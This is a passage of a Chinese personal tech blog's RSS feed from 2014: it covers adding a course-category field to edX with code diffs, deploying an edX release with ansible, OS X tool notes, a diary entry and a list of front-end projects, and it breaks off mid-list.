&lt;li&gt;自己写了个django app加入到lms/djangoapps里。app.models中有course_id字段&lt;/li&gt;
&lt;li&gt;自己写个首页&lt;/li&gt;
&lt;li&gt;在admin里管理首页的内容&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其实就像自己写了个小型内容管理系统，管理的核心对象是course。而我们知道课程的关键标志是course_id。我跟踪注册课程相关的代码，在代码执行路径上加上自定义的create_home_course函数。&lt;br /&gt;
在create_home_course函数中将新建的课程注册到我们自己的app.models里，关键是从中获得course_id，这样就能定位到课程。&lt;/p&gt;
&lt;p&gt;这种方式的好处是不需侵入CoueseFields&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;我们今天重点说下面的方案&lt;/p&gt;
&lt;h3&gt;现在的方案&lt;/h3&gt;
&lt;p&gt;其实思路也简单。就是跟踪&lt;code&gt;日程&amp;amp;细节&lt;/code&gt;里的字段是如何存储并与前端交互的。模仿它就行。&lt;/p&gt;
&lt;p&gt;好的，满上咖啡，我们开始。&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;我选择跟踪这个字段：&lt;code&gt;每周投入课程学习的小时数&lt;/code&gt;。 &lt;/p&gt;
&lt;p&gt;使用chrome开发者工具，看到该表单字段的id是 &lt;code&gt;course-effort&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在&lt;a href="https://github.com/edx/edx-platform"&gt;edx-platform&lt;/a&gt;搜索effort。我们就可以看到所有与effort相关的代码及其所在文件。其实挺推荐使用github来研究代码的，可以参考我的&lt;a href="http://wwj718.github.io/github-edx.html"&gt;这篇博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="github-search.png" src="img/github-search.png" /&gt;&lt;/p&gt;
&lt;p&gt;接下来就是依葫芦画瓢的工作了。据此添加我们需要的字段了。我们按照以下文件顺序修改:python&amp;gt;js&amp;gt;html&amp;gt;Sass&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;0&lt;/h3&gt;
&lt;p&gt;以下工作均在/edx/app/edxapp/edx-platform/目录里进行&lt;/p&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;p&gt;vim cms/djangoapps/models/settings/course_details.py &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;         self.effort = None  # int hours/week
+        self.category = None
         self.course_image_name = &amp;quot;&amp;quot;

         ...

+        temploc = course_key.make_usage_key(&amp;#39;about&amp;#39;, &amp;#39;category&amp;#39;)
+        try:
+            course_details.category = modulestore().get_item(temploc).data
+        except ItemNotFoundError:
+            pass
+
+
         temploc = course_key.make_usage_key(&amp;#39;about&amp;#39;, &amp;#39;video&amp;#39;)
         try:
             raw_video = modulestore().get_item(temploc).data

         ...

-        for about_type in [&amp;#39;syllabus&amp;#39;, &amp;#39;overview&amp;#39;, &amp;#39;effort&amp;#39;, &amp;#39;short_description&amp;#39;]:
+        for about_type in [&amp;#39;syllabus&amp;#39;, &amp;#39;overview&amp;#39;, &amp;#39;effort&amp;#39;,&amp;#39;category&amp;#39;, &amp;#39;short_description&amp;#39;]:
             cls.update_about_item(course_key, about_type, jsondict[about_type], descriptor, user)             
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;vim cms/templates/settings.html&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                        &amp;#39;requirements&amp;#39;, &amp;#39;syllabus&amp;#39;, &amp;#39;textbook&amp;#39;, &amp;#39;faq&amp;#39;, &amp;#39;more_info&amp;#39;,
                        &amp;#39;number&amp;#39;, &amp;#39;instructors&amp;#39;, &amp;#39;overview&amp;#39;,
-                       &amp;#39;effort&amp;#39;, &amp;#39;end_date&amp;#39;, &amp;#39;prerequisites&amp;#39;, &amp;#39;ocw_links&amp;#39;]:
+                       &amp;#39;effort&amp;#39;,&amp;#39;category&amp;#39;, &amp;#39;end_date&amp;#39;, &amp;#39;prerequisites&amp;#39;, &amp;#39;ocw_links&amp;#39;]:
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;js&lt;/h3&gt;
&lt;p&gt;vim cms/static/js/views/settings/main.js &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;         this.$el.find(&amp;#39;#&amp;#39; + this.fieldToSelectorMap[&amp;#39;effort&amp;#39;]).val(this.model.get(&amp;#39;effort&amp;#39;));
+
+        //added by wwj
+        this.$el.find(&amp;#39;#&amp;#39; + this.fieldToSelectorMap[&amp;#39;category&amp;#39;]).val(this.model.get(&amp;#39;category&amp;#39;));

        ...

         &amp;#39;effort&amp;#39; : &amp;quot;course-effort&amp;quot;,
+        &amp;#39;category&amp;#39; : &amp;quot;course-category&amp;quot;,
         &amp;#39;course_image_asset_path&amp;#39;: &amp;#39;course-image-url&amp;#39;

         ...

         case &amp;#39;course-effort&amp;#39;:
             this.setField(event);
             break;
+        //added by wwj
+        case &amp;#39;course-category&amp;#39;:
+            this.setField(event);
+            break;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;vim cms/static/js/models/settings/course_details.js &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;         effort: null,  // an int or null,
+        category: null,
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;html&lt;/h3&gt;
&lt;p&gt;vim cms/templates/settings.html &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+          ##added by wwj
+          % if about_page_editable:
+            &amp;lt;hr class=&amp;quot;divide&amp;quot; /&amp;gt;
+
+            &amp;lt;section class=&amp;quot;group-settings requirements&amp;quot;&amp;gt;
+              &amp;lt;header&amp;gt;
+                &amp;lt;h2 class=&amp;quot;title-2&amp;quot;&amp;gt;课程分类&amp;lt;/h2&amp;gt;
+                &amp;lt;span class=&amp;quot;tip&amp;quot;&amp;gt;${_(&amp;quot;Expectations of the students taking this course&amp;quot;)}&amp;lt;/span&amp;gt;
+              &amp;lt;/header&amp;gt;
+
+              &amp;lt;ol class=&amp;quot;list-input&amp;quot;&amp;gt;
+                &amp;lt;li class=&amp;quot;field text&amp;quot; id=&amp;quot;field-course-category&amp;quot;&amp;gt;
+                  &amp;lt;label for=&amp;quot;course-category&amp;quot;&amp;gt;${_(&amp;quot;course category&amp;quot;)}&amp;lt;/label&amp;gt;
+                  &amp;lt;input type=&amp;quot;text&amp;quot; class=&amp;quot;short time&amp;quot; id=&amp;quot;course-category&amp;quot; placeholder=&amp;quot;Math&amp;quot; /&amp;gt;
+                  &amp;lt;span class=&amp;quot;tip tip-inline&amp;quot;&amp;gt;${_(&amp;quot;course category&amp;quot;)}&amp;lt;/span&amp;gt;
+                &amp;lt;/li&amp;gt;
+              &amp;lt;/ol&amp;gt;
+            &amp;lt;/section&amp;gt;
+          % endif
+
       &amp;lt;/form&amp;gt;
     &amp;lt;/article&amp;gt;
     &amp;lt;aside class=&amp;quot;content-supplementary&amp;quot; role=&amp;quot;complimentary&amp;quot;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;vim lms/templates/courseware/course_about.html&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;             &amp;lt;li&amp;gt;&amp;lt;div class=&amp;quot;icon effort&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;p&amp;gt;${_(&amp;quot;Estimated Effort&amp;quot;)}&amp;lt;/p&amp;gt;&amp;lt;span class=&amp;quot;start-date&amp;quot;&amp;gt;${get_course_about_section(course, &amp;quot;effort&amp;quot;)}&amp;lt;/span&amp;gt;&amp;lt;/li&amp;gt;
           % endif

+          % if get_course_about_section(course, &amp;quot;category&amp;quot;):
+            &amp;lt;li&amp;gt;&amp;lt;div class=&amp;quot;icon category&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;p&amp;gt;课程分类&amp;lt;/p&amp;gt;&amp;lt;span class=&amp;quot;start-date&amp;quot;&amp;gt;${get_course_about_section(course, &amp;quot;category&amp;quot;)}&amp;lt;/span&amp;gt;&amp;lt;/li&amp;gt;
+          % endif
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Sass&lt;/h3&gt;
&lt;p&gt;vim cms/static/sass/views/_settings.scss &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;       #field-course-effort {
         width: flex-grid(3, 9);
       }
+      #field-course-category {
+        width: flex-grid(3, 9);
+      }
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;扫尾&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;将以上修改一次性commit到你自己的分支上，尽量不要合并到官方分支里&lt;/li&gt;
&lt;li&gt;update_assets&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -H -u edxapp bash
source /edx/app/edxapp/edxapp_env
cd /edx/app/edxapp/edx-platform
paver update_assets cms --settings=aws
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;*
  重启edxapp: &lt;code&gt;sudo /edx/bin/supervisorctl -c /edx/etc/supervisord.conf restart edxapp:&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;测试&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我们先到cms的&lt;code&gt;日程&amp;amp;细节&lt;/code&gt;里，填上课程分类&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="course_category" src="img/course_category.png" /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;再到课程的about页面即可看到&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="course-category-lms" src="img/course-category-lms.png" /&gt;&lt;/p&gt;
&lt;p&gt;搞定~&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 21 Oct 2014 00:00:00 +0000</pubDate><guid>tag:,2014-10-21:extend-edx-course.html</guid><category>edx</category></item><item><title>2014-10-1</title><link>/2014-10-1.html</link><description>&lt;h1&gt;1&lt;/h1&gt;
&lt;p&gt;昨晚做了个好梦，早上醒来的时候，脸上可能还有笑意&lt;/p&gt;
&lt;p&gt;窗外天气很好，阳光温和柔软，像婴儿的脸蛋，像情人的发梢&lt;/p&gt;
&lt;p&gt;初秋的天气已经转凉，昨晚睡觉的时候没关窗户，风不时吹来，被子捂得紧紧的&lt;/p&gt;
&lt;p&gt;在床上滚了两圈，心满意足地爬起。&lt;/p&gt;
&lt;p&gt;冲杯燕麦，就把早餐解决了，还打了个饱嗝。&lt;/p&gt;
&lt;p&gt;回了微信，刷完知乎，逛了github。看到许多有趣东西做完标记等有空再玩。&lt;/p&gt;
&lt;h1&gt;2&lt;/h1&gt;
&lt;p&gt;我穿着睡衣，把被子拿到楼上去晒，天气好得让人想到处跑&lt;/p&gt;
&lt;p&gt;回房间的时候又看了一遍 菠菜的这个答案，觉得甚好。翻出地图，找去玩的地方。&lt;/p&gt;
&lt;h1&gt;3&lt;/h1&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 01 Oct 2014 00:00:00 +0000</pubDate><guid>tag:,2014-10-01:2014-10-1.html</guid><category>随笔</category></item><item><title>OS X使用笔记</title><link>/OSX-note.html</link><description>&lt;p&gt;使用OS X有段时间了，之前用了近两年的linux，切换到OS X 下竟毫无不适，惊艳于macbook的触摸板以及平滑舒适的图形界面。OS X 的确是最不折腾的开发环境。&lt;/p&gt;
&lt;p&gt;罗列下自己常用的工具(其中一些也适用于linux)&lt;/p&gt;
&lt;h1&gt;命令行相关&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://brew.sh/"&gt;brew&lt;/a&gt;,类似于apt-get的包管理工具，强烈推荐&lt;/li&gt;
&lt;li&gt;zsh，当然还有它的小伙伴 &lt;a href="https://github.com/robbyrussell/oh-my-zsh"&gt;oh-my-zsh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;vim,首先安装插件管理工具&lt;a href="https://github.com/gmarik/Vundle.vim"&gt;Vundle&lt;/a&gt;,我的&lt;a href="https://github.com/wwj718/mytools/blob/master/.vimrc_for_mac"&gt;vim配置文件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;在OS X下使用vim-colors-solarized和vim-airline有些需要注意的地方，前者需要在~/.vimrc里加上let g:solarized_termcolors=256，后者需要安装字体，并配置shell终端(如iterm2)&lt;/li&gt;
&lt;li&gt;tmux，用于给窗口分屏，使用brew装&lt;/li&gt;
&lt;li&gt;screen，好像是自带的，用于保存会话&lt;/li&gt;
&lt;li&gt;&lt;a href="https://ngrok.com/"&gt;ngrok&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;emacs，学习sicp(计算机程序的构造和解释)的时候，作为Scheme的开发环境&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;系统相关&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://bjango.com/mac/istatmenus/"&gt;iStat Menus&lt;/a&gt;, 监控系统各类参数&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.trankynam.com/xtrafinder/"&gt;XtraFinder&lt;/a&gt;   对Finder进行增强&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.alfredapp.com/"&gt;Alfred&lt;/a&gt; ， 搜索入口&lt;/li&gt;
&lt;li&gt;&lt;a href="http://kapeli.com/dash"&gt;dash&lt;/a&gt; ， 文档阅读&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;常用软件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.google.com/intl/zh-CN/chrome/browser/"&gt;chrome&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://25.io/mou/"&gt;Mou&lt;/a&gt;,用过的markdown编辑器中最棒的&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.sourcetreeapp.com/"&gt;sourcetree&lt;/a&gt;,git client&lt;/li&gt;
&lt;li&gt;&lt;a href="boot2docker"&gt;boot2docker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.yinxiang.com/"&gt;Evernote&lt;/a&gt; , 笔记管理&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jetbrains.com/pycharm/"&gt;PyCharm&lt;/a&gt; ，python IDE&lt;/li&gt;
&lt;li&gt;&lt;a href="http://robomongo.org/"&gt;robomongo&lt;/a&gt; mongo client ， 支持远程数据库(使用ngrok把端口映射出来)&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mysql.com/products/workbench/"&gt;MySQLWorkbench&lt;/a&gt; MySQL client ,支持远程数据库&lt;/li&gt;
&lt;li&gt;&lt;a href="http://yun.baidu.com/"&gt;百度云同步盘&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;一些问题及解决方案&lt;/h1&gt;
&lt;h3&gt;cpu温度过高&lt;/h3&gt;
&lt;p&gt;我用的是mac air，之所以选择air，因为我对性能要求不高，大多时间我都在在使用 ssh/vim/chrome，air轻巧，往包里一扔就是，固态硬盘，又没有pro的发热问题&lt;/p&gt;
&lt;p&gt;不过偶尔也会遇到大量占用cpu的时候，诸如dash 在index的时候，以及偶尔使用pycharm，遇到git仓库十分庞大时(edX)，在index的时候,可能会导致cpu占用率飙升到400%，温度也随之飙升。&lt;/p&gt;
&lt;p&gt;后来我找到了这个工具&lt;a href="https://github.com/opsengine/cpulimit"&gt;cpulimit&lt;/a&gt;,linux下也是可用的，使用方法也简单，查到进程pid，限制它的cup使用率就行，具体参考&lt;a href="http://cpulimit.sourceforge.net/"&gt;cpulimit&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;附 osx相关资源&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://macshuo.com/"&gt;MacTalk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20873070"&gt;程序员如何优雅地使用 Mac&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 27 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-27:OSX-note.html</guid><category>随笔</category></item><item><title>部署edx release-2014-09-17</title><link>/edx-install-release-2014-09-17.html</link><description>&lt;p&gt;在新的服务器上部署edX(version=release-2014-09-17)成功，过程还是挺折腾的，做个笔记。&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.idefs.com/share-open-share-2014-9-18-edx-ova-template-by-edustack.html"&gt;竹轩&lt;/a&gt;同学整理了2014年8月12日以来(到14.9.18)edx上更新的内容,更新内容很多，许多新的特性还是很实用的，也修复了不少bug，这也会我决定使用新版本的原因&lt;/p&gt;
&lt;h1&gt;部署经过&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/edx/configuration/wiki/edX-Ubuntu-12.04-64-bit-Installation"&gt;官方教程&lt;/a&gt;，新旧版本都适用。主要的安装步骤里边都有。我采用了Manual installation，分步安装，其实就是把一步安装脚本拆开来&lt;/p&gt;
&lt;h3&gt;换源&lt;/h3&gt;
&lt;p&gt;我的ubuntu版本是12.04.5，默认apt源是国内的，会找不到依赖包，所以我们先换源。欧洲源好像还不行（也有部分软件包无法拉下来），所以后来我采用美国的源。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#备份
sudo cp /etc/apt/sources.list /etc/apt/sources.list.bat
#添加us的源
sudo vim /etc/apt/sources.list，加入以下内容

###### Ubuntu Main Repos
deb http://us.archive.ubuntu.com/ubuntu/ precise main restricted universe multiverse 
deb-src http://us.archive.ubuntu.com/ubuntu/ precise main restricted universe multiverse 

###### Ubuntu Update Repos
deb http://us.archive.ubuntu.com/ubuntu/ precise-security main restricted universe multiverse 
deb http://us.archive.ubuntu.com/ubuntu/ precise-updates main restricted universe multiverse 
deb http://us.archive.ubuntu.com/ubuntu/ precise-backports main restricted universe multiverse 
deb-src http://us.archive.ubuntu.com/ubuntu/ precise-security main restricted universe multiverse 
deb-src http://us.archive.ubuntu.com/ubuntu/ precise-updates main restricted universe multiverse 
deb-src http://us.archive.ubuntu.com/ubuntu/ precise-backports main restricted universe multiverse 

###### Ubuntu Partner Repo
deb http://archive.canonical.com/ubuntu precise partner
deb-src http://archive.canonical.com/ubuntu precise partner

###### Ubuntu Extras Repo
deb http://extras.ubuntu.com/ubuntu precise main
deb-src http://extras.ubuntu.com/ubuntu precise main
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;deb http://extras.ubuntu.com/ubuntu precise main，可能会说你缺少密钥，无视它&lt;/p&gt;
&lt;p&gt;sudo apt-get upgrade 之后，记得看下ssh配置文件(/etc/ssh/sshd_config)，确定允许认证登录: PasswordAuthentication yes&lt;/p&gt;
&lt;p&gt;之后再重启&lt;/p&gt;
&lt;h3&gt;部署&lt;/h3&gt;
&lt;p&gt;下面我们就按照官方教程部署&lt;a href="https://github.com/edx/configuration/wiki/edX-Ubuntu-12.04-64-bit-Installation"&gt;edX-Ubuntu-12.04-64-bit-Installation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果完全按照官方教程走，那么安装的edx版本是master（生产环境尽量不要安装master版本），也就是最新的，作为第一个吃螃蟹的人，遇到问题挺不好解决的。所以最好是安装某个版本，自己或别人部署成功过的。&lt;/p&gt;
&lt;p&gt;要做到这点，就在安装的时候指定版本，像下面这样&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd /var/tmp/configuration/playbooks &amp;amp;&amp;amp; sudo ansible-playbook -c local ./edx_sandbox.yml -i &amp;quot;localhost,&amp;quot;  -e edx_platform_version=release-2014-09-17
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;以上是我用的，edx-platform版本是release-2014-09-17&lt;/p&gt;
&lt;p&gt;之后的安装过程遇到的错误，其实大同小异，无非网络问题(推荐使用&lt;a href="http://wwj718.github.io/use-sshuttle.html"&gt;sshuttle&lt;/a&gt;)，兼容（依赖）问题，如果再哪一步断了(一般都会中断，很少有一次成功),可以停下来解决完问题再继续.&lt;/p&gt;
&lt;p&gt;当遇到的是国外网络无法连接问题，使用sshuttle就好&lt;/p&gt;
&lt;p&gt;需要注意的是使用sshuttle的时候，服务器ip就被隐藏了，你一旦退出ssh连接就无法再连上。解决方案也是有的。使用ngrok映射出ssh端口，可以参考我的&lt;a href="http://wwj718.github.io/use-ngrok.html"&gt;这篇文章&lt;/a&gt;，目前不清楚原因，偶然发现的，也许还算原创^_^&lt;/p&gt;
&lt;p&gt;当遇到系统依赖问题。诸如 TASK: [edxapp | install python base-requirements］报错说无法找到依赖包(比如使用了豆瓣源)，就手动切换到edxapp用户，source到edxapp_environment，至于edxapp_environment在那个，可查看playbooks/roles/edxapp里的相关参数，或是直接这样 /edx/app/edxapp/venvs/edxapp/bin/pip  安装好依赖再从这个task执行就好&lt;/p&gt;
&lt;h4&gt;从某个task继续执行&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd /var/tmp/configuration/playbooks &amp;amp;&amp;amp; sudo ansible-playbook -c local ./edx_sandbox.yml -i &amp;quot;localhost,&amp;quot;  -e edx_platform_version=release-2014-09-17 --start-at-task=&amp;quot;TASK_NAME&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这里需要注意的是，有些步骤有前后依赖问题，诸如前面步骤设置了运行所需参数，所以有时可能要倒退几个task开始，如何寻找之前的task，查看/var/tmp/configuration/playbooks/roles/...&lt;/p&gt;
&lt;p&gt;暂时写到这里，新版本的汉化和主题可能也有些变更，之后再写&lt;/p&gt;
&lt;h1&gt;附&lt;/h1&gt;
&lt;h2&gt;1&lt;/h2&gt;
&lt;p&gt;竹轩同学提到的&lt;a href="http://www.idefs.com/share-open-share-2014-9-18-edx-ova-template-by-edustack.html"&gt;近期部署可能遇到的问题@2014.9.18&lt;/a&gt;，我在ubuntu上直接部署没有遇到。不过之前在安装devstack时遇到了。&lt;/p&gt;
&lt;p&gt;后来我的devstack又部署了之前用的release-2014-07-02&lt;/p&gt;
&lt;h2&gt;2&lt;/h2&gt;
&lt;p&gt;python换源&lt;/p&gt;
&lt;p&gt;如果觉得国外python源太慢，可以换用国内的，我用的是豆瓣&lt;/p&gt;
&lt;p&gt;vim /var/tmp/configuration/playbooks/roles/common/defaults/main.yml&lt;/p&gt;
&lt;p&gt;&lt;code&gt;COMMON_PYPI_MIRROR_URL: 'http://pypi.douban.com/simple&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用豆瓣源时，速度很快，不过在edxapp(user_role)安装/edx/app/edxapp/edx-platform/requirements/edx/base.txt的时候找不到dogapi==1.2.1。我是停下来手动装好了&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 26 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-26:edx-install-release-2014-09-17.html</guid><category>edx</category></item><item><title>有趣的前端项目收集</title><link>/front-interesting.html</link><description>&lt;hr /&gt;
&lt;h1&gt;PhysicsJS&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;你可以很方便地实现各种物理运动效果，比如碰撞、下落等。&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wellcaffeinated/PhysicsJS"&gt;PhysicsJS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wellcaffeinated.net/PhysicsJS/#demo-3"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;three.js&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Three.js 是一款运行在浏览器中的3D 引擎，你可以用它创建各种三维场景&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mrdoob/three.js"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://carvisualizer.plus360degrees.com/threejs/"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;D3.&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;是一个用动态图形显示数据的JavaScript库&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mbostock/d3"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mbostock/d3/wiki/Gallery"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;impress.js&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;在线演示工具  可视为web版的ppt 效果比ppt更酷&lt;/li&gt;
&lt;li&gt;&lt;a href="github.com/bartaz/impress.js"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://bartaz.github.io/impress.js/#/bored"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;reveal.js&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;另一款在线演示工具&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hakimel/reveal.js"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lab.hakim.se/reveal-js/#/1"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;socket.io&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;socket.io 是一个为实时应用提供跨平台实时通信的库&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Automattic/socket.io"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://chat.socket.io/"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Chart.js&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Chart.js是一个基于HTML5 canvas技术的开源图表绘制工具库&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/nnnick/Chart.js"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=""&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;另外两个交互式图表&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ecomfe/echarts"&gt;echarts&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://echarts.baidu.com/doc/example/map12.html"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/highslide-software/highcharts.com"&gt;highcharts&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.highcharts.com/demo"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;gitbook&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;可以借用该工具使用Github/Git和Markdown来制作精美的图书&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/GitbookIO/gitbook"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tyleradl.gitbooks.io/how-to-make-french-toast/introduction/README.html"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;iZhihu&lt;/h3&gt;
&lt;p&gt;我最近正在用gitbook做个东西，暂时起名iZhihu&lt;/p&gt;
&lt;h3&gt;需求描述&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;知乎的搜索功能很弱,知乎的匹配机制非常糟糕，不只被一次吐槽了&lt;/li&gt;
&lt;li&gt;而我又十分喜欢和依赖它,从生活建议，出游策略，淘宝购物，第一个想到的都是知乎，有时候写作／微信／聊天 的时候，想到知乎里有趣的言论，想引用却很难找到，尤其是我这种收藏夹里有上千条资料的用户。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;解决方案：使用爬虫爬取用户收藏资料，使用gitbook做成精美文档，支持搜索，支持导出pdf&lt;/p&gt;
&lt;p&gt;知乎的用户有极高的用户黏度，知乎的核心价值在高质量内容，可挖掘点是高质内容n可运用到那些地方  ps：其实最初想法就是为了自己方便囧&lt;/p&gt;
&lt;h3&gt;使用场景&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;微信聊天时，可搜索iZhihu公众号，根据搜索内容返回最佳匹配优质回答（来自用户收藏夹）&lt;/li&gt;
&lt;li&gt;用户可保存自己心爱的资料，聚散有时，知乎会挂，而我想永存这些资料，最好是可收藏易使用的精致版本&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;迭代&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可搜索范围加大，诸如定向搜索大牛的答案&lt;/li&gt;
&lt;li&gt;可以建立各类分组，比如超过1000赞的，最佳吐槽之类，这种分类有些搜狗输入法匹配词汇的意味，个性化&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;目前进度&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;会使用gitbook&lt;/li&gt;
&lt;li&gt;能有爬虫爬取到知乎指定内容&lt;/li&gt;
&lt;li&gt;使用正则匹配搜索结果&lt;/li&gt;
&lt;li&gt;第一版做来自己用，mac下实现，直接使用grep来过滤搜索，打算整合进Alfred&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;node-webkit&lt;/h1&gt;
&lt;ul&gt;
